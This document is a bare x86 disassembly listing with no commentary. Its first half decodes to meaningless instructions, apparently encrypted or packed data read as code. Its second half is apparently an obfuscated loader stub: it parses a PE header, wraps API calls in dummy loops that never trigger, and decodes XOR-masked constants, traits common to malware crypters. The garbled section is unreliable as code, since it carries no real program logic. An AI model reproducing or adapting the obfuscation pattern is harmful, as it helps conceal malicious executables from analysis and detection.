  4137d6:	rcr    BYTE PTR [eiz*8-0x230e1143],0xc0
  4137de:	cmp    al,0x6b
  4137e0:	jmp    0x4137a2
  4137e2:	sub    esi,DWORD PTR [ecx+0x4c]
  4137e5:	push   esi
  4137e6:	xchg   ebp,eax
  4137e7:	xor    al,0xd6
  4137e9:	add    eax,0xf1220dc9
  4137ee:	mov    ebx,0x44779d3d
  4137f3:	add    eax,DWORD PTR ss:[eax]
  4137f6:	jbe    0x413867
  4137f8:	daa    
  4137f9:	mov    edx,0xd29670bb
  4137fe:	dec    esi
  4137ff:	inc    eax
  413800:	shr    al,1
  413802:	fiadd  WORD PTR [edx+0x58066f96]
  413808:	lods   al,BYTE PTR gs:[esi]
  41380a:	mov    ds:0xd54c7512,eax
  41380f:	jb     0x4137c6
  413811:	pop    ecx
  413812:	mov    dh,0x84
  413814:	scas   eax,DWORD PTR es:[edi]
  413815:	fadd   DWORD PTR [ecx]
  413817:	in     al,dx
  413818:	pop    es
  413819:	shl    BYTE PTR [esi-0x50fb5ee0],cl
  41381f:	lea    ecx,[edx-0x42598229]
  413825:	mov    ebp,0x590d6c0c
  41382a:	mov    ss,WORD PTR [edx]
  41382c:	lock xchg esi,eax
  41382e:	sti    
  41382f:	push   eax
  413830:	dec    eax
  413831:	cmp    al,0x7a
  413833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413834:	(bad)  
  413835:	push   0x2a327150
  41383a:	rcl    DWORD PTR [ecx-0x4e],0x97
  41383e:	push   bp
  413840:	push   ecx
  413841:	(bad)  
  413843:	pop    es
  413844:	sbb    dh,BYTE PTR [esi]
  413846:	jnp    0x413839
  413848:	mov    ch,0x18
  41384a:	jb     0x4138bb
  41384c:	add    eax,0x33ee0866
  413851:	mov    esp,0x3ef608a4
  413856:	cwde   
  413857:	div    DWORD PTR [edx+0x75]
  41385a:	call   0x23e0b942
  41385f:	xchg   edi,eax
  413860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413861:	xor    eax,0xe689a3b6
  413866:	pop    esp
  413867:	cmp    bh,BYTE PTR [esi-0x44]
  41386a:	push   ecx
  41386b:	shl    DWORD PTR [ebp-0x5e1751e4],1
  413871:	es xor ch,0x89
  413875:	adc    edx,DWORD PTR [ebp+0x29e1fb3]
  41387b:	aad    0xb2
  41387d:	adc    esi,ebx
  41387f:	iret   
  413880:	mov    WORD PTR [ecx-0xb],es
  413883:	cmp    eax,edi
  413885:	das    
  413886:	mov    DWORD PTR [edx-0x35],0xfa96608f
  41388d:	jge    0x413867
  41388f:	ja     0x4138fb
  413891:	push   es
  413892:	mov    edx,0xc6e3e5
  413897:	fdiv   QWORD PTR [esi-0x27]
  41389a:	mov    cl,0x62
  41389c:	push   ebp
  41389d:	es stos BYTE PTR es:[edi],al
  41389f:	jbe    0x413833
  4138a1:	xchg   edx,eax
  4138a2:	sub    ch,BYTE PTR [ebx+0x63]
  4138a5:	test   BYTE PTR [eax-0x30],dl
  4138a8:	clc    
  4138a9:	out    0x5f,eax
  4138ab:	mov    al,BYTE PTR [edi-0x29]
  4138ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138af:	cmp    BYTE PTR [edx+0x4629617d],al
  4138b5:	add    BYTE PTR [eax],bl
  4138b7:	xor    BYTE PTR [edx+0x4375cccc],ch
  4138bd:	or     BYTE PTR [eax-0x30d76751],dh
  4138c3:	or     DWORD PTR [ebx],ebp
  4138c5:	or     eax,0x73d4d6fb
  4138ca:	mov    WORD PTR [edi-0x21],es
  4138cd:	jl     0x4138ce
  4138cf:	cli    
  4138d0:	(bad)  
  4138d1:	mov    ch,0x96
  4138d3:	jg     0x41386c
  4138d5:	mov    bl,0x31
  4138d7:	cmp    ebx,DWORD PTR [edi-0x3e]
  4138da:	in     eax,0x32
  4138dc:	out    dx,al
  4138dd:	cmp    ecx,DWORD PTR [eax]
  4138df:	pop    ss
  4138e0:	mov    DWORD PTR [ebx-0x6a],ecx
  4138e3:	ds jne 0x413877
  4138e6:	int    0x9d
  4138e8:	adc    cl,dh
  4138ea:	loope  0x41389d
  4138ec:	pop    ds
  4138ed:	(bad)  
  4138ee:	in     al,dx
  4138ef:	add    DWORD PTR [edi],edi
  4138f1:	sbb    al,0xd2
  4138f3:	push   esp
  4138f4:	or     esp,DWORD PTR [esi-0x37]
  4138f7:	test   al,0x86
  4138f9:	inc    ecx
  4138fa:	int3   
  4138fb:	repnz aad 0x8a
  4138fe:	jp     0x41388f
  413900:	mov    edx,0x263e9fa2
  413905:	and    eax,0x9150daa2
  41390a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41390b:	sbb    esi,ebp
  41390d:	in     eax,0x3d
  41390f:	ret    
  413910:	jbe    0x4138d8
  413912:	lock mov ds:0x2d675b28,eax
  413918:	test   DWORD PTR [esi],ecx
  41391a:	aas    
  41391b:	adc    eax,0x329a2ed6
  413920:	xchg   ebx,eax
  413921:	mov    WORD PTR [edx],ss
  413923:	fucomip st,st(3)
  413925:	dec    ebx
  413926:	sbb    eax,0xa4d205da
  41392b:	loope  0x413975
  41392d:	pushf  
  41392e:	sub    BYTE PTR [ebx-0x35245888],dl
  413934:	dec    edi
  413935:	cmp    DWORD PTR [esi-0x2831e421],eax
  41393b:	mov    esp,0xb579232e
  413940:	xchg   esi,eax
  413941:	jge    0x4138cd
  413943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413944:	loope  0x41398b
  413946:	fmul   st,st(3)
  413948:	sub    BYTE PTR [edi+0x35ff3017],dh
  41394e:	jmp    0x70ad:0x6f2ffc86
  413955:	cmp    bl,BYTE PTR [eax+0x70]
  413958:	and    BYTE PTR [ebp-0x8],0x2c
  41395c:	dec    eax
  41395d:	sbb    eax,0x9623219d
  413962:	cmp    al,0x70
  413964:	dec    ebx
  413965:	inc    edi
  413966:	cmp    edi,DWORD PTR [ebp+0x36b844d3]
  41396c:	sar    BYTE PTR [edi-0x3d],1
  41396f:	not    BYTE PTR [ebp+0x43]
  413972:	iret   
  413973:	(bad)  
  413974:	fsubr  st,st(6)
  413976:	or     ah,BYTE PTR [ecx]
  413978:	test   eax,0x1be4fbf7
  41397d:	fdiv   DWORD PTR [eax+0x71]
  413980:	lods   eax,DWORD PTR ds:[esi]
  413981:	lods   eax,DWORD PTR ds:[esi]
  413982:	hlt    
  413983:	mov    eax,ds:0xc7b45a4a
  413988:	xlat   BYTE PTR ds:[ebx]
  413989:	and    al,0xe3
  41398b:	and    DWORD PTR [edx+0x22],edx
  41398e:	leave  
  41398f:	push   esi
  413990:	mov    WORD PTR [eax],ss
  413992:	sbb    ch,cl
  413994:	pop    ebx
  413995:	dec    esi
  413996:	cs repz dec edi
  413999:	sbb    al,BYTE PTR [eax-0x56]
  41399c:	mov    cl,0x83
  41399e:	add    al,0x5e
  4139a0:	ret    0xc41a
  4139a3:	cwde   
  4139a4:	ins    DWORD PTR es:[edi],dx
  4139a5:	arpl   WORD PTR [eax+0x27],dx
  4139a8:	jns    0x413992
  4139aa:	scas   eax,DWORD PTR es:[edi]
  4139ab:	and    dl,0xa
  4139ae:	dec    eax
  4139af:	inc    ecx
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	addr16 (bad) 
  4139b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139b4:	adc    al,0x8b
  4139b6:	jmp    0xbb9a:0x5a1b218b
  4139bd:	and    BYTE PTR ds:0xe89699e3,al
  4139c3:	stos   DWORD PTR es:[edi],eax
  4139c4:	jno    0x413a3e
  4139c6:	mov    eax,ds:0x362c4b4e
  4139cb:	mov    bl,0x26
  4139cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139ce:	scas   al,BYTE PTR es:[edi]
  4139cf:	xchg   edx,eax
  4139d0:	jecxz  0x413a46
  4139d2:	imul   ebp,DWORD PTR [edx-0x68],0x33
  4139d6:	cmp    esi,DWORD PTR [edi]
  4139d8:	push   ebp
  4139d9:	iret   
  4139da:	hlt    
  4139db:	lea    ecx,[ecx]
  4139dd:	mov    esp,0xfa0855b5
  4139e2:	ins    BYTE PTR es:[edi],dx
  4139e3:	mov    ebp,DWORD PTR [ebx]
  4139e5:	cdq    
  4139e6:	cmp    al,0x89
  4139e8:	cdq    
  4139e9:	dec    ebp
  4139ea:	mov    bl,0x9c
  4139ec:	or     esi,eax
  4139ee:	aam    0xa1
  4139f0:	cwde   
  4139f1:	jno    0x413a5a
  4139f3:	mov    cs,WORD PTR [ebx+edi*1]
  4139f6:	mov    esp,eax
  4139f8:	leave  
  4139f9:	jne    0x413a1e
  4139fb:	fsubr  QWORD PTR [esi+0x3a]
  4139fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139ff:	xor    BYTE PTR [esi],bh
  413a01:	lea    eax,[edx]
  413a03:	stc    
  413a04:	out    0x4c,al
  413a06:	je     0x4139f4
  413a08:	inc    ecx
  413a09:	pop    ds
  413a0a:	inc    ecx
  413a0b:	push   ecx
  413a0c:	aad    0xa6
  413a0e:	mov    al,ds:0x3afb42ef
  413a13:	leave  
  413a14:	rol    BYTE PTR [ecx+edx*2],1
  413a17:	mov    ecx,0x46d06414
  413a1c:	and    al,0xa5
  413a1e:	pop    esp
  413a1f:	idiv   DWORD PTR [eax-0x75]
  413a22:	cs jg  0x413aa3
  413a25:	sbb    eax,0x58648153
  413a2a:	sbb    BYTE PTR [ebx+ebx*2-0x4aae2622],ch
  413a31:	call   0xb499:0x1d0e7ba4
  413a38:	mov    dh,0x70
  413a3a:	loopne 0x4139e6
  413a3c:	jl     0x413ab4
  413a3e:	sbb    ch,BYTE PTR [ecx+esi*1]
  413a41:	rcr    BYTE PTR [edi],1
  413a43:	div    DWORD PTR [edx-0x1507b1da]
  413a49:	ins    BYTE PTR es:[edi],dx
  413a4a:	xchg   esp,eax
  413a4b:	jns    0x4139e7
  413a4d:	arpl   WORD PTR [eax-0x2d2b6a02],ax
  413a53:	xlat   BYTE PTR ds:[ebx]
  413a54:	je     0x4139fa
  413a56:	repnz dec ebx
  413a58:	sbb    esp,DWORD PTR [edi-0x5800ac4]
  413a5e:	(bad)  
  413a5f:	mov    dl,0x3c
  413a61:	(bad)  
  413a62:	pusha  
  413a63:	sbb    BYTE PTR ds:0xd7f40444,ah
  413a69:	jae    0x413aad
  413a6b:	shl    BYTE PTR [edi+edi*8],cl
  413a6e:	xchg   ebx,eax
  413a6f:	repz test al,0xbd
  413a72:	loop   0x413ad7
  413a74:	sub    BYTE PTR [eax],dl
  413a76:	jmp    FWORD PTR [esp+ecx*4-0x33c65b27]
  413a7d:	ret    0x60b
  413a80:	sub    eax,0x160e2380
  413a85:	cs leave 
  413a87:	scas   eax,DWORD PTR es:[edi]
  413a88:	les    ecx,FWORD PTR [edi]
  413a8a:	mov    ds:0x776351de,al
  413a8f:	adc    edx,DWORD PTR [ebx+0x58]
  413a92:	sbb    eax,edx
  413a94:	sbb    eax,0xdce46973
  413a99:	dec    ebp
  413a9a:	hlt    
  413a9b:	mov    al,ds:0x732f08a0
  413aa0:	xchg   esi,eax
  413aa1:	and    dl,BYTE PTR [edi]
  413aa3:	mov    cl,BYTE PTR [esi+0x50cd7184]
  413aa9:	leave  
  413aaa:	in     al,dx
  413aab:	aas    
  413aac:	sbb    BYTE PTR [eax],dl
  413aae:	(bad)  
  413aaf:	mov    ah,0x68
  413ab1:	sbb    DWORD PTR [ebp+0x1cac1528],eax
  413ab7:	ret    0xdb8a
  413aba:	ss dec ebp
  413abc:	xchg   edx,eax
  413abd:	or     DWORD PTR [esi+0x534899b0],eax
  413ac3:	mov    al,0xff
  413ac5:	idiv   DWORD PTR ds:0x22db3521
  413acb:	cmp    eax,0x492f65a2
  413ad0:	pushf  
  413ad1:	pop    edi
  413ad2:	(bad)  
  413ad4:	adc    BYTE PTR [ebp-0x7dac3c7f],ch
  413ada:	mov    bl,0x4f
  413adc:	add    al,0xab
  413ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413adf:	xchg   edi,eax
  413ae0:	hlt    
  413ae1:	push   eax
  413ae2:	ror    al,cl
  413ae4:	sub    eax,0xa98a0bf2
  413ae9:	std    
  413aea:	dec    eax
  413aeb:	or     eax,0x71c753ad
  413af0:	push   ebx
  413af1:	popf   
  413af2:	cs jg  0x413b2a
  413af5:	test   eax,0xc3b00d7
  413afa:	add    BYTE PTR ds:0xc438eafc,dh
  413b00:	scas   al,BYTE PTR es:[edi]
  413b01:	je     0x413b1c
  413b03:	push   ecx
  413b04:	mov    dh,0x2f
  413b06:	sar    BYTE PTR [esp+ebp*1-0x49e81b8f],cl
  413b0d:	adc    cl,al
  413b0f:	repnz into 
  413b11:	sbb    bh,bl
  413b13:	sub    ah,ah
  413b15:	push   eax
  413b16:	xlat   BYTE PTR ds:[ebx]
  413b17:	pusha  
  413b18:	mov    BYTE PTR [edi+0x6ac8a728],bl
  413b1e:	dec    ebx
  413b1f:	xchg   esp,eax
  413b20:	jecxz  0x413b59
  413b22:	mov    WORD PTR [eax+0x381a5f90],?
  413b28:	rcr    DWORD PTR [edi-0x64d29ea7],1
  413b2e:	(bad)  
  413b2f:	arpl   si,bx
  413b31:	(bad)  
  413b32:	cs mov edi,0xd6829dce
  413b38:	pop    ecx
  413b39:	(bad)  
  413b3a:	cmc    
  413b3b:	inc    bx
  413b3d:	jb     0x413b92
  413b3f:	jb     0x413b77
  413b41:	call   0xcc1c88fa
  413b46:	mov    esp,0x828ed202
  413b4b:	dec    ebp
  413b4c:	lea    esi,[edx+0x16]
  413b4f:	dec    ebx
  413b50:	mov    ah,0x15
  413b52:	pop    esi
  413b53:	enter  0xad93,0x4a
  413b57:	loope  0x413b4c
  413b59:	jg     0x413bb8
  413b5b:	mov    edx,DWORD PTR [esi-0x69]
  413b5e:	imul   ebp,DWORD PTR [edx-0x1d],0xfe6ddb0e
  413b65:	sub    eax,0x743558fd
  413b6a:	pushf  
  413b6b:	xor    al,dh
  413b6d:	push   ecx
  413b6e:	push   cs
  413b6f:	mov    cl,0xac
  413b71:	in     al,dx
  413b72:	sub    eax,0xf83d593f
  413b77:	and    ebx,0xe386e79
  413b7d:	pop    ebp
  413b7e:	sbb    BYTE PTR [ebx-0x1f57fb6b],dh
  413b84:	or     ch,BYTE PTR [edi+0x5d]
  413b87:	ja     0x413b45
  413b89:	bound  esi,QWORD PTR [edi+0x284c2167]
  413b8f:	pop    esp
  413b90:	fsubr  QWORD PTR [ebp-0x145a7370]
  413b96:	cmp    DWORD PTR [edi+0x2455aea],0x65
  413b9d:	in     al,0x69
  413b9f:	ror    DWORD PTR [esi+0x6b],1
  413ba2:	lds    ebx,FWORD PTR [ebp+0x45]
  413ba5:	outs   dx,DWORD PTR ds:[esi]
  413ba6:	push   es
  413ba7:	lahf   
  413ba8:	fdivr  st(5),st
  413baa:	xchg   ecx,eax
  413bab:	ret    0x416d
  413bae:	lea    ecx,[ecx-0x550ba791]
  413bb4:	mov    eax,ds:0x842deb0
  413bb9:	in     al,dx
  413bba:	mov    BYTE PTR [esi-0x48],dh
  413bbd:	fdivrp st(2),st
  413bbf:	cmp    DWORD PTR [ebp+0xdecbc5d],edi
  413bc5:	inc    esp
  413bc6:	dec    edx
  413bc7:	xor    eax,0x1fa9bcdb
  413bcc:	fdiv   QWORD PTR [edi+ebx*1-0x6c]
  413bd0:	pop    ss
  413bd1:	retf   0x302c
  413bd4:	loop   0x413bac
  413bd6:	ins    DWORD PTR es:[edi],dx
  413bd7:	inc    esp
  413bd8:	jns    0x413bcf
  413bda:	jl     0x413c02
  413bdc:	arpl   WORD PTR [edx-0x44bd8eae],di
  413be2:	mov    cl,0xb2
  413be4:	out    0xbc,eax
  413be6:	dec    ecx
  413be7:	out    dx,al
  413be8:	xchg   DWORD PTR [ebx],eax
  413bea:	rol    DWORD PTR [ebx-0x2fcc0029],1
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421ce2
  413c08:	mov    ds:0x421cea,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421ab2
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x423878
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a7e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x423893
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423956
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a76
  413f9e:	mov    eax,ds:0x421a86
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421ade
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c66
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x4239d0
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
